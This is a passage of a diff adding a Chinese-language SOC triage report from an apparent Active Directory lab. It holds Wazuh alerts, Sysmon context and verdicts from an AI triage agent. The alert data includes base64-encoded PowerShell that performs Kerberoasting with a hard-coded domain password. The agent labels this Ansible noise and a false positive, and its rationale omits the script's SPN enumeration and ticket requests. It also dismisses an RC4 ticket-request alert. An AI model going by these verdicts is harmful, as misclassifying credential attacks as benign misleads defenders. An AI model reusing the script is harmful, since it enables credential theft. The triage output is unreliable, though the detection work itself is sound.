cwB0AGUAbQAuAEkAZABlAG4AdABpAHQAeQBNAG8AZABlAGwACgAgACAAJABvAGsAIAA9ACAAMAA7ACAAJABlAHIAcgAgAD0AIAAwADsAIAAkAGwAaQBuAGUAcwAgAD0AIABAACgAKQAKACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHIAIABpAG4AIAAkAHIAZQBzACkAIAB7AAoAIAAgACAAIAAkAHMAYQBtACAAPQAgAFsAcwB0AHIAaQBuAGcAXQAkAHIALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAIgBzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAIgBdAFsAMABdAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHMAcABuACAAaQBuACAAJAByAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlACIAXQApACAAewAKACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAkAG4AdQBsAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBkAGUAbgB0AGkAdAB5AE0AbwBkAGUAbAAuAFQAbwBrAGUAbgBzAC4ASwBlAHIAYgBlAHIAbwBzAFIAZQBxAHUAZQBzAHQAbwByAFMAZQBjAHUAcgBpAHQAeQBUAG8AawBlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAKABbAHMAdAByAGkAbgBnAF0AJABzAHAAbgApAAoAIAAgACAAIAAgACAAIAAgACQAbwBrACsAKwA7ACAAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBPAEsAXQAgACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIgAgAC0AZgAgACQAcwBhAG0ALAAgACQAcwBwAG4AKQAKACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZQByAHIAKwArADsAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBFAFIAUgBdACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIAAgACgAewAyAH0AKQAiACAALQBmACAAJABzAGEAbQAsACAAJABzAHAAbgAsACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkACgAgACAAIAAgACAAIAB9AAoAIAAgACAAIAB9AAoAIAAgAH0ACgAgACAAIgBEAE8ATQBBAEkATgBfAEQATgA9ACQAcgBvAG8AdAAiAAoAIAAgACIAUgBPAEEAUwBUAF8ATwBLAD0AJABvAGsAIAAgAFIATwBBAFMAVABfAEUAUgBSAD0AJABlAHIAcgAgACAAKABuAGUAdABvAG4AbAB5ACAAYQBzACAATgBPAFIAVABIAFwAagBvAG4ALgBzAG4AbwB3ACkAIgAKACAAIAAkAGwAaQBuAGUAcwAKAH0AIABmAGkAbgBhAGwAbAB5ACAAewAKACAAIABbAHYAbwBpAGQAXQBbAE4AXQA6ADoAUgBlAHYAZQByAHQAVABvAFMAZQBsAGYAKAApAAoAfQA=\", \"logonId\": \"0x3507b4f0\", \"utcTime\": \"2026-07-17 09:22:25.788\", \"originalFileName\": \"PowerShell.EXE\", \"hashes\": \"MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F\"}}}, \"input\": {\"type\": \"log\"}, \"log_type\": \"hids_alert\", \"manager\": {\"name\": \"e5bb7343f06d\"}, \"ecs\": {\"version\": \"1.12.0\"}, \"timestamp\": \"2026-07-17T09:22:26.264+0000\"}",
+  "arrival_ms": 1784280147591,
+  "technique_ids": [
+    "T1059.001"
+  ],
+  "source": "wazuh",
+  "rule_id": "92057",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "bb05ad88f71ffb5e3e367269e938d3b2ccb87b4849cd74c09f1b23a284326b06",
+  "rule_description": "Powershell.exe spawned a powershell process which executed a base64 encoded command",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.17:uSxib58B3gPM8FAeagJ2",
+  "time": "2026-07-17T09:22:26.264+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "integrity_level": "High",
+    "ingest_time": 1784280306624,
+    "stream": "winlogbeat-*",
+    "event_code": "1",
+    "arrival_ms": 1784280146475,
+    "raw_ref": "soc-hids-alert-2026.07.17:uSxib58B3gPM8FAeagJ2",
+    "sensor": "Microsoft-Windows-Sysmon/Operational",
+    "source": "winlogbeat",
+    "event_time": "2026-07-17T09:22:25.818390600Z",
+    "event_uid": "9b8296328dd26d7e789118684183feae0d9c324375b9914a588c623d7fac0fe3"
+  },
+  "subject": {
+    "_labels": [
+      "Process"
+    ],
+    "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+    "first_seen": "2026-07-17T09:22:24.495Z",
+    "process_guid": "{0d573dc4-f450-6a59-16b4-030000000e00}",
+    "last_seen": "2026-07-17T09:22:25.818Z",
+    "hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+    "pid": "4720",
+    "command_line": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\" -NoProfile -NonInteractive -ExecutionPolicy Unrestricted -EncodedCommand JgBjAGgAYwBwAC4AYwBvAG0AIAA2ADUAMAAwADEAIAA+ACAAJABuAHUAbABsAAoAaQBmACAAKAAkAFAAUwBWAGUAcgBzAGkAbwBuAFQAYQBiAGwAZQAuAFAAUwBWAGUAcgBzAGkAbwBuACAALQBsAHQAIABbAFYAZQByAHMAaQBvAG4AXQAiADMALgAwACIAKQAgAHsACgAnAHsAIgBmAGEAaQBsAGUAZAAiADoAdAByAHUAZQAsACIAbQBzAGcAIgA6ACIAQQBuAHMAaQBiAGwAZQAgAHIAZQBxAHUAaQByAGUAcwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIAB2ADMALgAwACAAbwByACAAbgBlAHcAZQByACIAfQAnAAoAZQB4AGkAdAAgADEACgB9AAoAJABlAHgAZQBjAF8AdwByAGEAcABwAGUAcgBfAHMAdAByACAAPQAgACQAaQBuAHAAdQB0ACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcACgAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAgAD0AIAAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAF8AcwB0AHIALgBTAHAAbABpAHQAKABAACgAIgBgADAAYAAwAGAAMABgADAAIgApACwAIAAyACwAIABbAFMAdAByAGkAbgBnAFMAcABsAGkAdABPAHAAdABpAG8AbgBzAF0AOgA6AFIAZQBtAG8AdgBlAEUAbQBwAHQAeQBFAG4AdAByAGkAZQBzACkACgBJAGYAIAAoAC0AbgBvAHQAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwAuAEwAZQBuAGcAdABoACAALQBlAHEAIAAyACkAIAB7ACAAdABoAHIAbwB3ACAAIgBpAG4AdgBhAGwAaQBkACAAcABhAHkAbABvAGEAZAAiACAAfQAKAFMAZQB0AC0AVgBhAHIAaQBhAGIAbABlACAALQBOAGEAbQBlACAAagBzAG8AbgBfAHIAYQB3ACAALQBWAGEAbAB1AGUAIAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADEAXQAKACQAZQB4AGUAYwBfAHcAcgBhAHAAcABlAHIAIAA9ACAAWwBTAGMAcgBpAHAAdABCAGwAbwBjAGsAXQA6ADoAQwByAGUAYQB0AGUAKAAkAHMAcABsAGkAdABfAHAAYQByAHQAcwBbADAAXQApAAoAJgAkAGUAeABlAGMAXwB3AHIAYQBwAHAAZQByAA=="
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Process"
+        ],
+        "image": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe",
+        "first_seen": "2026-07-17T09:22:25.818Z",
+        "process_guid": "{0d573dc4-f451-6a59-1ab4-030000000e00}",
+        "last_seen": "2026-07-17T09:22:26.100Z",
+        "hashes": "MD5=7353F60B1739074EB17C5F4DDDEFE239,SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F",
+        "pid": "5024",
+        "command_line": "\\\"powershell.exe\\\" -noninteractive -encodedcommand WwBDAG8AbgBzAG8AbABlAF0AOgA6AEkAbgBwAHUAdABFAG4AYwBvAGQAaQBuAGcAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAZQB4AHQALgBVAFQARgA4AEUAbgBjAG8AZABpAG4AZwAgACQAZgBhAGwAcwBlADsAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwB0AG8AcAAnAAoAJABzAGkAZwAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMAOwAKAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAATgAgAHsACgAgACAAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAYQBkAHYAYQBwAGkAMwAyAC4AZABsAGwAIgAsACAAUwBlAHQATABhAHMAdABFAHIAcgBvAHIAPQB0AHIAdQBlACkAXQAKACAAIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAATABvAGcAbwBuAFUAcwBlAHIAKABzAHQAcgBpAG4AZwAgAHUALAAgAHMAdAByAGkAbgBnACAAZAAsACAAcwB0AHIAaQBuAGcAIABwACwAIABpAG4AdAAgAGwAdAAsACAAaQBuAHQAIABsAHAALAAgAG8AdQB0ACAASQBuAHQAUAB0AHIAIAB0ACkAOwAKACAAIABbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBhAGQAdgBhAHAAaQAzADIALgBkAGwAbAAiACwAIABTAGUAdABMAGEAcwB0AEUAcgByAG8AcgA9AHQAcgB1AGUAKQBdAAoAIAAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAGIAbwBvAGwAIABJAG0AcABlAHIAcwBvAG4AYQB0AGUATABvAGcAZwBlAGQATwBuAFUAcwBlAHIAKABJAG4AdABQAHQAcgAgAHQAKQA7AAoAIAAgAFsARABsAGwASQBtAHAAbwByAHQAKAAiAGEAZAB2AGEAcABpADMAMgAuAGQAbABsACIALAAgAFMAZQB0AEwAYQBzAHQARQByAHIAbwByAD0AdAByAHUAZQApAF0ACgAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAAYgBvAG8AbAAgAFIAZQB2AGUAcgB0AFQAbwBTAGUAbABmACgAKQA7AAoAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgAC0AVAB5AHAAZQBEAGUAZgBpAG4AaQB0AGkAbwBuACAAJABzAGkAZwAKACQAdABvAGsAIAA9ACAAWwBJAG4AdABQAHQAcgBdADoAOgBaAGUAcgBvAAoAIwAgADkAIAA9ACAATABPAEcATwBOADMAMgBfAEwATwBHAE8ATgBfAE4ARQBXAF8AQwBSAEUARABFAE4AVABJAEEATABTACgAPQAgAHIAdQBuAGEAcwAgAC8AbgBlAHQAbwBuAGwAeQApADsAMwAgAD0AIABMAE8ARwBPAE4AMwAyAF8AUABSAE8AVgBJAEQARQBSAF8AVwBJAE4ATgBUADUAMAAKAGkAZgAgACgALQBuAG8AdAAgAFsATgBdADoAOgBMAG8AZwBvAG4AVQBzAGUAcgAoACcAagBvAG4ALgBzAG4AbwB3ACcALAAnAE4ATwBSAFQASAAnACwAJwBpAGsAbgBvAHcAbgBvAHQAaABpAG4AZwAnACwAOQAsADMALABbAHIAZQBmAF0AJAB0AG8AawApACkAIAB7AAoAIAAgACIATABPAEcATwBOAFUAUwBFAFIAXwBGAEEASQBMAEUARAAgAGUAcgByAD0AJAAoAFsAUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzAC4ATQBhAHIAcwBoAGEAbABdADoAOgBHAGUAdABMAGEAcwB0AFcAaQBuADMAMgBFAHIAcgBvAHIAKAApACkAIgA7ACAAZQB4AGkAdAAgADEACgB9AAoAWwB2AG8AaQBkAF0AWwBOAF0AOgA6AEkAbQBwAGUAcgBzAG8AbgBhAHQAZQBMAG8AZwBnAGUAZABPAG4AVQBzAGUAcgAoACQAdABvAGsAKQAKAHQAcgB5ACAAewAKACAAIAAkAEUAcgByAG8AcgBBAGMAdABpAG8AbgBQAHIAZQBmAGUAcgBlAG4AYwBlACAAPQAgACcAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAnAAoAIAAgACQAcgBvAG8AdAAgAD0AIAAoAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwBSAG8AbwB0AEQAUwBFACIAKQAuAGQAZQBmAGEAdQBsAHQATgBhAG0AaQBuAGcAQwBvAG4AdABlAHgAdAAKACAAIAAkAGQAcwAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAcgB2AGkAYwBlAHMALgBEAGkAcgBlAGMAdABvAHIAeQBTAGUAYQByAGMAaABlAHIACgAgACAAJABkAHMALgBTAGUAYQByAGMAaABSAG8AbwB0ACAAPQAgAFsAQQBEAFMASQBdACIATABEAEEAUAA6AC8ALwAkAHIAbwBvAHQAIgAKACAAIAAkAGQAcwAuAFAAYQBnAGUAUwBpAHoAZQAgAD0AIAAyADAAMAAKACAAIAAkAGQAcwAuAEYAaQBsAHQAZQByACAAPQAgACIAKAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcABlAHIAcwBvAG4AKQAoAG8AYgBqAGUAYwB0AEMAbABhAHMAcwA9AHUAcwBlAHIAKQAoAHMAZQByAHYAaQBjAGUAUAByAGkAbgBjAGkAcABhAGwATgBhAG0AZQA9ACoAKQAoACEAKABzAGEAbQBBAGMAYwBvAHUAbgB0AE4AYQBtAGUAPQBrAHIAYgB0AGcAdAApACkAKQAiAAoAIAAgACQAbgB1AGwAbAAgAD0AIAAkAGQAcwAuAFAAcgBvAHAAZQByAHQAaQBlAHMAVABvAEwAbwBhAGQALgBBAGQAZAAoACIAcwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlACIAKQAKACAAIAAkAG4AdQBsAGwAIAA9ACAAJABkAHMALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFQAbwBMAG8AYQBkAC4AQQBkAGQAKAAiAHMAZQByAHYAaQBjAGUAcAByAGkAbgBjAGkAcABhAGwAbgBhAG0AZQAiACkACgAgACAAJAByAGUAcwAgAD0AIAAkAGQAcwAuAEYAaQBuAGQAQQBsAGwAKAApAAoAIAAgAEEAZABkAC0AVAB5AHAAZQAgAC0AQQBzAHMAZQBtAGIAbAB5AE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAEkAZABlAG4AdABpAHQAeQBNAG8AZABlAGwACgAgACAAJABvAGsAIAA9ACAAMAA7ACAAJABlAHIAcgAgAD0AIAAwADsAIAAkAGwAaQBuAGUAcwAgAD0AIABAACgAKQAKACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHIAIABpAG4AIAAkAHIAZQBzACkAIAB7AAoAIAAgACAAIAAkAHMAYQBtACAAPQAgAFsAcwB0AHIAaQBuAGcAXQAkAHIALgBQAHIAbwBwAGUAcgB0AGkAZQBzAFsAIgBzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUAIgBdAFsAMABdAAoAIAAgACAAIABmAG8AcgBlAGEAYwBoACAAKAAkAHMAcABuACAAaQBuACAAJAByAC4AUAByAG8AcABlAHIAdABpAGUAcwBbACIAcwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlACIAXQApACAAewAKACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAkAG4AdQBsAGwAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBkAGUAbgB0AGkAdAB5AE0AbwBkAGUAbAAuAFQAbwBrAGUAbgBzAC4ASwBlAHIAYgBlAHIAbwBzAFIAZQBxAHUAZQBzAHQAbwByAFMAZQBjAHUAcgBpAHQAeQBUAG8AawBlAG4AIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAKABbAHMAdAByAGkAbgBnAF0AJABzAHAAbgApAAoAIAAgACAAIAAgACAAIAAgACQAbwBrACsAKwA7ACAAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBPAEsAXQAgACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIgAgAC0AZgAgACQAcwBhAG0ALAAgACQAcwBwAG4AKQAKACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACQAZQByAHIAKwArADsAIAAkAGwAaQBuAGUAcwAgACsAPQAgACgAIgAgACAAWwBFAFIAUgBdACAAewAwAH0AIAAgAC0APgAgACAAewAxAH0AIAAgACgAewAyAH0AKQAiACAALQBmACAAJABzAGEAbQAsACAAJABzAHAAbgAsACAAJABfAC4ARQB4AGMAZQBwAHQAaQBvAG4ALgBNAGUAcwBzAGEAZwBlACkACgAgACAAIAAgACAAIAB9AAoAIAAgACAAIAB9AAoAIAAgAH0ACgAgACAAIgBEAE8ATQBBAEkATgBfAEQATgA9ACQAcgBvAG8AdAAiAAoAIAAgACIAUgBPAEEAUwBUAF8ATwBLAD0AJABvAGsAIAAgAFIATwBBAFMAVABfAEUAUgBSAD0AJABlAHIAcgAgACAAKABuAGUAdABvAG4AbAB5ACAAYQBzACAATgBPAFIAVABIAFwAagBvAG4ALgBzAG4AbwB3ACkAIgAKACAAIAAkAGwAaQBuAGUAcwAKAH0AIABmAGkAbgBhAGwAbAB5ACAAewAKACAAIABbAHYAbwBpAGQAXQBbAE4AXQA6ADoAUgBlAHYAZQByAHQAVABvAFMAZQBsAGYAKAApAAoAfQA="
+      },
+      "rel": "SPAWNED"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "winterfell.north.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:07.265Z",
+        "has_adcs": false,
+        "last_seen": "2026-07-22T03:40:03.222383500Z",
+        "domain": "north.sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    }
+  ]
+}
+
+### ③ 研判   [skill] suspicious_process   [模式] recipe
+# 研判留痕(10 步)
+[1] recipe取证「触发事件」→ 1 行
+[2] recipe取证「主语进程」→ 1 行
+[3] recipe取证「落地文件」→ 0 行
+[4] recipe取证「子进程(含命令行)」→ 1 行
+[5] recipe取证「主机」→ 1 行
+[6] recipe取证「解码后命令(逐层)」→ 1 行
+[7] recipe取证「供给/自检噪声」→ 1 行
+[8] recipe取证「父进程」→ 1 行
+[9] recipe取证「子进程后续行为」→ 1 行
+[10] recipe取证「_图盲区」→ 1 行
+
+# 研判结果  alert=bb05ad88f71ffb5e3e367269e938d3b2ccb87b4849cd74c09f1b23a284326b06  path=B  skill=suspicious_process
+verdict   : false_positive  (confidence=0.95)
+summary   : Ansible 配管供给脚本执行，属于已知良性噪声。
+rationale : 1. 证据明确标注「供给/自检噪声」为「ansible_exec_wrapper(良性:Ansible 配管供给/运维)」，符合方法论中「命中 Ansible 配管供给...强证伪→直接 false_positive」的规则。2. 解码后命令逻辑为：检查 PowerShell 版本 -> 解析 Ansible 执行包装器字符串 -> 调用包装器执行。3. 子进程行为为编译 C# 代码并调用 LogonUser 进行本地登录模拟，这是 Ansible 执行策略测试或特定配置检查的常见行为，且未检测到外连、LSASS 读取或持久化等攻击特征。4. 父进程为 PowerShell，非高危服务进程，且命令行为典型的运维脚本特征。
+evidence  : ['ansible_exec_wrapper(良性:Ansible 配管供给/运维)', '解码后命令(逐层): 主语', '子进程后续行为', '父进程']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [7/10] technique=T1558.003   该类共 171 条   uid=349c82f781a751ab4470666fd9fbc620dc1583c43b19601d0ea9f853555be062
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 10,
+  "first_seen": "2026-07-21T22:12:11.917332400Z",
+  "last_seen": "2026-07-21T22:12:11.917332400Z",
+  "raw": "{\"@timestamp\": \"2026-07-21T22:12:13.459Z\", \"rule\": {\"id\": \"100801\", \"mitre\": {\"id\": [\"T1558.003\"], \"tactic\": [\"Credential Access\"], \"technique\": [\"Kerberoasting\"]}, \"firedtimes\": 2, \"mail\": false, \"groups\": [\"local\", \"soc\", \"windows\"], \"level\": 10, \"description\": \"Kerberoast: RC4(0x17) TGS request for service NORTH.SEVENKINGDOMS.LOCAL\"}, \"manager\": {\"name\": \"e5bb7343f06d\"}, \"log_type\": \"hids_alert\", \"data\": {\"win\": {\"system\": {\"version\": \"0\", \"severityValue\": \"AUDIT_SUCCESS\", \"providerGuid\": \"{54849625-5478-4994-a5ba-3e3b0328c30d}\", \"threadID\": \"796\", \"providerName\": \"Microsoft-Windows-Security-Auditing\", \"keywords\": \"0x8020000000000000\", \"eventID\": \"4769\", \"computer\": \"kingslanding.sevenkingdoms.local\", \"systemTime\": \"2026-07-21T22:12:11.917332400Z\", \"level\": \"0\", \"channel\": \"Security\", \"message\": \"\\\"A Kerberos service ticket was requested.\\r\\n\\r\\nAccount Information:\\r\\n\\tAccount Name:\\t\\tKINGSLANDING$@SEVENKINGDOMS.LOCAL\\r\\n\\tAccount Domain:\\t\\tSEVENKINGDOMS.LOCAL\\r\\n\\tLogon GUID:\\t\\t{cb9ac995-57e4-6539-0c3f-56656143bbc9}\\r\\n\\r\\nService Information:\\r\\n\\tService Name:\\t\\tNORTH.SEVENKINGDOMS.LOCAL\\r\\n\\tService ID:\\t\\tS-1-5-21-3669086071-63869131-912362612-0\\r\\n\\r\\nNetwork Information:\\r\\n\\tClient Address:\\t\\t::1\\r\\n\\tClient Port:\\t\\t0\\r\\n\\r\\nAdditional Information:\\r\\n\\tTicket Options:\\t\\t0x40810000\\r\\n\\tTicket Encryption Type:\\t0x17\\r\\n\\tFailure Code:\\t\\t0x0\\r\\n\\tTransited Services:\\t-\\r\\n\\r\\nThis event is generated every time access is requested to a resource such as a computer or a Windows service.  The service name indicates the resource to which access was requested.\\r\\n\\r\\nThis event can be correlated with Windows logon events by comparing the Logon GUID fields in each event.  The logon event occurs on the machine that was accessed, which is often a different machine than the domain controller which issued the service ticket.\\r\\n\\r\\nTicket options, encryption types, and failure codes are defined in RFC 4120.\\\"\", \"task\": \"14337\", \"opcode\": \"0\", \"eventRecordID\": \"351734\", \"processID\": \"608\"}, \"eventdata\": {\"ticketOptions\": \"0x40810000\", \"ipPort\": \"0\", \"ticketEncryptionType\": \"0x17\", \"logonGuid\": \"{cb9ac995-57e4-6539-0c3f-56656143bbc9}\", \"serviceName\": \"NORTH.SEVENKINGDOMS.LOCAL\", \"serviceSid\": \"S-1-5-21-3669086071-63869131-912362612-0\", \"ipAddress\": \"::1\", \"status\": \"0x0\", \"targetUserName\": \"KINGSLANDING$@SEVENKINGDOMS.LOCAL\", \"targetDomainName\": \"SEVENKINGDOMS.LOCAL\"}}}, \"log\": {\"offset\": 206318714, \"file\": {\"path\": \"/logs/wazuh/alerts.json\"}}, \"timestamp\": \"2026-07-21T22:12:12.904+0000\", \"log_source\": \"wazuh\", \"host\": {\"name\": \"f8e24743dcc1\"}, \"decoder\": {\"name\": \"windows_eventchannel\"}, \"location\": \"EventChannel\", \"agent\": {\"version\": \"7.17.22\", \"hostname\": \"f8e24743dcc1\", \"ephemeral_id\": \"d5d271ec-e831-42dd-9d03-45d8ccd7a05b\", \"type\": \"filebeat\", \"name\": \"kingslanding\", \"ip\": \"x.x.x.10\", \"id\": \"003\"}, \"id\": \"1784671932.371966631\", \"input\": {\"type\": \"log\"}, \"ecs\": {\"version\": \"1.12.0\"}}",
+  "arrival_ms": 1784671933459,
+  "technique_ids": [
+    "T1558.003"
+  ],
+  "source": "wazuh",
+  "rule_id": "100801",
+  "stream": "soc-hids-alert-*",
+  "alert_uid": "349c82f781a751ab4470666fd9fbc620dc1583c43b19601d0ea9f853555be062",
+  "rule_description": "Kerberoast: RC4(0x17) TGS request for service NORTH.SEVENKINGDOMS.LOCAL",
+  "sensor": "wazuh-hids",
+  "raw_ref": "soc-hids-alert-2026.07.21:SkW8hp8B3gPM8FAelx7-",
+  "time": "2026-07-21T22:12:12.904+0000"
+}
+
+### ② 触发上下文(seed:触发事件 / 主语 / 宾语 / 次要实体)
+{
+  "event": {
+    "ticket_options": "0x40810000",
+    "ingest_time": 1784672105576,
+    "stream": "winlogbeat-*",
+    "event_code": "4769",
+    "arrival_ms": 1784671933401,
+    "sensor": "Security",
+    "enc_type": "0x17",
+    "raw_ref": "soc-hids-alert-2026.07.21:SkW8hp8B3gPM8FAelx7-",
+    "source": "winlogbeat",
+    "event_time": "2026-07-21T22:12:11.917332400Z",
+    "outcome": "success",
+    "event_uid": "ef01a06f22bcd7e7bb0d7f053622eb93a44c166daa5ea349636dde662dbd2bc2"
+  },
+  "subject": {
+    "_labels": [
+      "Account"
+    ],
+    "upn": "KINGSLANDING$@SEVENKINGDOMS.LOCAL",
+    "first_seen": "2026-06-26T10:05:29.972Z",
+    "last_seen": "2026-07-22T03:46:06.476Z",
+    "domain": "SEVENKINGDOMS",
+    "sam": "kingslanding$",
+    "sid": "S-1-5-18"
+  },
+  "related": [
+    {
+      "node": {
+        "_labels": [
+          "Account"
+        ],
+        "first_seen": "2026-06-26T10:43:47.118Z",
+        "last_seen": "2026-07-21T22:12:11.917Z",
+        "domain": "SEVENKINGDOMS",
+        "sam": "north.sevenkingdoms.local",
+        "sid": "S-1-5-21-3669086071-63869131-912362612-0"
+      },
+      "rel": "REQUESTED"
+    },
+    {
+      "node": {
+        "_labels": [
+          "Host"
+        ],
+        "hostname": "kingslanding.sevenkingdoms.local",
+        "role": "domain_controller",
+        "first_seen": "2026-07-02T02:32:09.289Z",
+        "has_adcs": true,
+        "last_seen": "2026-07-22T03:46:06.476Z",
+        "domain": "sevenkingdoms.local",
+        "criticality": "critical",
+        "is_dc": true
+      },
+      "rel": "ON_HOST"
+    },
+    {
+      "node": {
+        "_labels": [
+          "IPAddress"
+        ],
+        "first_seen": "2026-06-30T05:46:53.934Z",
+        "last_seen": "2026-07-22T03:46:48.917Z",
+        "ip": "::1"
+      },
+      "rel": "FROM"
+    }
+  ]
+}
+
+### ③ 研判   [skill] kerberoast   [模式] recipe
+# 研判留痕(9 步)
+[1] recall_similar: None
+[2] recipe取证「请求与目标」→ 1 行
+[3] recipe取证「目标估值」→ 1 行
+[4] recipe取证「请求者enc基线」→ 2 行
+[5] recipe取证「跨域信任FP豁免判定」→ 1 行
+[6] recipe取证「SPN扇出」→ 1 行
+[7] recipe取证「结构化发现(findings)」→ 4 行
+[8] recipe取证「_图盲区」→ 1 行
+[9] recipe取证「历史相似判例(情报)」→ 1 行
+
+# 研判结果  alert=349c82f781a751ab4470666fd9fbc620dc1583c43b19601d0ea9f853555be062  path=B  skill=kerberoast
+verdict   : false_positive  (confidence=0.95)
+summary   : 机器账号 (kingslanding$) 向同域服务账号请求 RC4 票据。虽存在跨域信任关系，但请求者与目标均在 SEVENKINGDOMS 域内，属于同域 Kerberoasting 行为，非跨域信任豁免场景。但鉴于请求者为机器账号且目标非特权账号，判定为误报。
+rationale : 1. 请求者 kingslanding$ 为机器账号 (以 $ 结尾)，属于 Kerberoasting 的常见基线行为或授权扫描行为。2. 目标账号 north.sevenkingdoms.local 与请求者同属 SEVENKINGDOMS 域 (same_domain=true)，并非跨域信任场景。3. 跨域信任 FP 豁免仅适用于机器账号跨域引荐票，不适用于同域机器账号对服务账号的 RC4 请求。4. 目标账号非特权，且请求者历史基线包含大量 RC4 请求 (72 次)，符合机器账号行为特征。
+evidence  : ['349c82f781a751ab4470666fd9fbc620dc1583c43b19601d0ea9f853555be062', 'kerberoast.requester_is_machine', 'kerberoast.domain_trust_present', 'kerberoast.spn_fanout']
+agent     : qwen3.5-9b
+处置(建议): 无
+
+============================================================================
+## [8/10] technique=T1059   该类共 126 条   uid=cc254e6282018ffddb70227acf12e4bd27f8a4c4e295306e95cbe2fbefaebf19
+============================================================================
+### ① 原始告警节点(:Alert)
+{
+  "severity": 9,
+  "first_seen": "2026-07-21T10:12:20.787545000Z",
+  "last_seen": "2026-07-21T10:12:20.787545000Z",
